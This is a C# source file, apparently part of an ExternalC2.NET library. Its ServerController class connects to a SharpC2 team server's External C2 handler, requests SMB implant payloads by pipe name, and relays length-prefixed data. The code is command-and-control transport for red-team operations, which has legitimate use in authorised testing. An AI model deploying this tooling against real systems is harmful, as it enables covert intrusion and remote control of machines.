using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace ExternalC2.NET.Server;

/// <summary>
/// Controller to handle connections with SharpC2's External C2 Handler
/// </summary>
public sealed class ServerController : IDisposable
{
    private readonly IPAddress _address;
    private readonly int _port;
    private TcpClient _client;
    
    /// <summary>
    /// 
    /// </summary>
    /// <param name="address">The IPAddress of the Team Server</param>
    /// <param name="port">The port of the External C2 Handler</param>
    public ServerController(IPAddress address, int port)
    {
        _address = address;
        _port = port;
    }

    /// <summary>
    /// Attempt to connect to the Team Server
    /// </summary>
    /// <returns></returns>
    public async Task<bool> Connect()
    {
        _client = new TcpClient();

        try
        {
            await _client.ConnectAsync(_address, _port);
            return true;
        }
        catch
        {
            _client.Dispose();
            return false;
        }
    }

    /// <summary>
    /// Request an SMB payload from the Team Server
    /// </summary>
    /// <param name="pipename"></param>
    /// <returns></returns>
    public async Task<byte[]> RequestPayload(string pipename)
    {
        await SendData(Encoding.Default.GetBytes(pipename));
        await Task.Delay(new TimeSpan(0, 0, 3));

        return await ReadData();
    }

    /// <summary>
    /// Send data to the Team Server
    /// </summary>
    /// <param name="data"></param>
    public async Task SendData(byte[] data)
    {
        // format data as [length][value]
        var lengthBuf = BitConverter.GetBytes(data.Length);
        var lv = new byte[lengthBuf.Length + data.Length];

        Buffer.BlockCopy(lengthBuf, 0, lv, 0, lengthBuf.Length);
        Buffer.BlockCopy(data, 0, lv, lengthBuf.Length, data.Length);
        
        using var ms = new MemoryStream(lv);
        var stream = _client.GetStream();
        
        // write in chunks
        var bytesRemaining = lv.Length;
        do
        {
            var lengthToSend = bytesRemaining < 1024 ? bytesRemaining : 1024;
            var buf = new byte[lengthToSend];
            
            var read = await ms.ReadAsync(buf, 0, lengthToSend);

            if (read != lengthToSend)
                throw new Exception("Could not read data from stream");
            
            await stream.WriteAsync(buf, 0, buf.Length);
            
            bytesRemaining -= lengthToSend;
        }
        while (bytesRemaining > 0);
    }

    /// <summary>
    /// Read data from the Team Server
    /// </summary>
    /// <returns></returns>
    public async Task<byte[]> ReadData()
    {
        var stream = _client.GetStream();
        
        // read length
        var lengthBuf = new byte[4];
        var read = await stream.ReadAsync(lengthBuf, 0, 4);

        if (read != 4)
            throw new Exception("Failed to read length");

        var length = BitConverter.ToInt32(lengthBuf, 0);
        
        // read rest of data
        using var ms = new MemoryStream();
        var totalRead = 0;
        
        do
        {
            var buf = new byte[1024];
            read = await stream.ReadAsync(buf, 0, buf.Length);

            await ms.WriteAsync(buf, 0, read);
            totalRead += read;
        }
        while (totalRead < length);
        
        return ms.ToArray();
    }

    public void Dispose()
    {
        _client.Dispose();
    }
}